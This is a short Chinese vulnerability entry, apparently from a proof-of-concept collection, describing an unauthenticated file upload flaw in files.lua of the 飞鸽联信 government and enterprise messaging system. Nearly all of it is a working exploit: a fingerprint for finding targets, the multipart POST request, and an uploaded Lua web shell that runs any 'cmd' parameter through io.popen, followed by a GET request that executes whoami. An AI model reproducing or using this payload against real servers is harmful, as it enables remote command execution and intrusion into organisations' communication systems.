# 飞鸽联信政企即时通讯系统files.lua存在文件上传漏洞

- **系统**：飞鸽联信政企即时通讯系统files.lua　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="561018561"`
- **请求**：`POST /files.lua?a=v2 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary20f63cf53…`　`Content-Length: 103498`

**请求体 / payload**
```
------geckoformboundary20f63cf5367f78c58c0a5a7ea7ec6e71
Content-Disposition: form-data; name="filename0"; filename="1.lua"
Content-Type: image/jpeg
function handle_request()
-- 1. 获取URL中的查询参数
local query = mg.request_info.query_string or ""
-- 2. 提取cmd参数值（简单解析，不处理复杂URL编码）
local cmd = string.match(query, "cmd=([^&]+)")
-- 3. 无cmd参数时返回提示
if not cmd then
mg.write("Content-Type: text/plain\r\n\r\n请传入cmd参数，示例：?cmd=whoami")
return
end
-- 4. 直接执行命令（极高风险！）
local handle = io.popen(cmd, "r")
local result = handle:read("*a")
handle:close()
-- 5. 返回执行结果
mg.write("Content-Type: text/plain; charset=utf-8\r\n\r\n")
mg.write("命令输出：\n" .. (result or "无输出"))
end
handle_request()
------geckoformboundary20f63cf5367f78c58c0a5a7ea7ec6e71--
访问上传的文件地址
GET /file/20260108-140824-607211-f500f8.lua?cmd=whoami HTTP/1.1
Host:
```
- **预期**：200　|　—